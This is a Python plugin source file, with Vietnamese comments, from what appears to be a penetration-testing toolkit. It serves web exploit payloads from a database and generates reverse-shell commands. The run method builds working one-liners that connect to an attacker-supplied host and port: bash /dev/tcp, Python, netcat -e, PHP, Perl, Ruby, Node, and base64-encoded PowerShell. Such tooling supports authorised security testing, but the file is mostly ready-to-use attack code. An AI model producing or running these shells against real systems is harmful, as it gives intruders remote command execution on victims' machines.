import os
import json
import base64
from core.base_plugin import BasePlugin


class PayloadGeneratorPlugin(BasePlugin):
    """
    Plugin (P3): Sinh auto-payload (Reverse Shells + Web Exploit Payloads).
    V1.0: Tích hợp payload_db.json từ PayloadsAllTheThings.
    """

    _payload_db = None  # Cache payload DB

    def name(self) -> str:
        return "PayloadGenerator"

    def description(self) -> str:
        return "Sinh Reverse Shell & Web Exploit Payloads (SQLi, XSS, SSRF, SSTI, LFI, XXE, CMDi, NoSQL, LDAP)"

    def check_installed(self) -> bool:
        return True

    # ================================================================
    # WEB PAYLOAD DATABASE
    # ================================================================

    def _get_db_path(self) -> str:
        """Trả về đường dẫn tuyệt đối tới payload_db.json."""
        return os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "payload_db.json")

    def load_payload_db(self) -> dict:
        """
        Load payload database từ data/payload_db.json.
        Trả về toàn bộ DB dict. Kết quả được cache.
        """
        if PayloadGeneratorPlugin._payload_db is not None:
            return PayloadGeneratorPlugin._payload_db

        db_path = self._get_db_path()
        if not os.path.exists(db_path):
            return {}

        with open(db_path, 'r', errors='replace') as f:
            PayloadGeneratorPlugin._payload_db = json.load(f)
        return PayloadGeneratorPlugin._payload_db

    def list_categories(self) -> list:
        """
        Liệt kê tất cả categories có sẵn trong payload DB.
        VD: ['sqli', 'xss', 'cmdi', 'ssrf', 'ssti', 'lfi', 'xxe', 'nosql', 'ldap', 'open_redirect', 'crlf']
        """
        db = self.load_payload_db()
        return list(db.get("categories", {}).keys())

    def list_subcategories(self, category: str) -> list:
        """Liệt kê subcategories cho một category cụ thể."""
        db = self.load_payload_db()
        cat = db.get("categories", {}).get(category, {})
        return list(cat.get("subcategories", {}).keys())

    def get_web_payloads(self, category: str, subcategory: str = None, limit: int = 0) -> list:
        """
        Trả về danh sách payloads theo category và subcategory.

        :param category: VD: 'sqli', 'xss', 'cmdi', 'ssrf', 'ssti', 'lfi'
        :param subcategory: VD: 'auth_bypass', 'polyglots'. Nếu None → trả về tất cả subcategories.
        :param limit: Giới hạn số payloads trả về. 0 = tất cả.
        :return: List[str] payloads
        """
        db = self.load_payload_db()
        cat = db.get("categories", {}).get(category, {})
        subs = cat.get("subcategories", {})

        if not subs:
            return []

        payloads = []
        if subcategory:
            sub = subs.get(subcategory, {})
            payloads = sub.get("payloads", [])
        else:
            # Merge tất cả subcategories
            for sub_data in subs.values():
                payloads.extend(sub_data.get("payloads", []))

        if limit > 0:
            payloads = payloads[:limit]
        return payloads

    def get_category_info(self, category: str) -> dict:
        """Trả về metadata của category (description, số subcategories, tổng payloads)."""
        db = self.load_payload_db()
        cat = db.get("categories", {}).get(category, {})
        if not cat:
            return {}

        total = sum(len(s.get("payloads", [])) for s in cat.get("subcategories", {}).values())
        return {
            "description": cat.get("description", ""),
            "subcategories": list(cat.get("subcategories", {}).keys()),
            "total_payloads": total
        }

    # ================================================================
    # REVERSE SHELL GENERATOR (Legacy — giữ nguyên)
    # ================================================================

    def run(self, lhost: str, lport: int, os_type: str = "linux", shell_type: str = "bash") -> str:
        """
        Sinh payload dựa trên hệ điều hành và công cụ có sẵn.
        :param lhost: Trỏ về IP của attacker
        :param lport: Port đang listen (nc -lvnp)
        """
        payload = ""
        os_type = os_type.lower()
        shell_type = shell_type.lower()

        if os_type == "linux":
            if shell_type == "bash":
                payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            elif shell_type == "python":
                payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            elif shell_type in ("nc", "netcat"):
                payload = f"nc -e /bin/sh {lhost} {lport}"
            elif shell_type == "php":
                payload = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            elif shell_type == "perl":
                payload = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
            elif shell_type == "ruby":
                payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            elif shell_type == "node":
                payload = f"node -e '(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})();'"
            else:
                payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

        elif os_type == "windows":
            if shell_type == "powershell":
                raw = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}};$client.Close()"
                b64 = base64.b64encode(raw.encode('utf-16le')).decode()
                payload = f"powershell -e {b64}"
            elif shell_type in ("nc", "netcat"):
                payload = f"nc.exe -e cmd.exe {lhost} {lport}"
            else:
                payload = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}};$client.Close()\""

        return payload
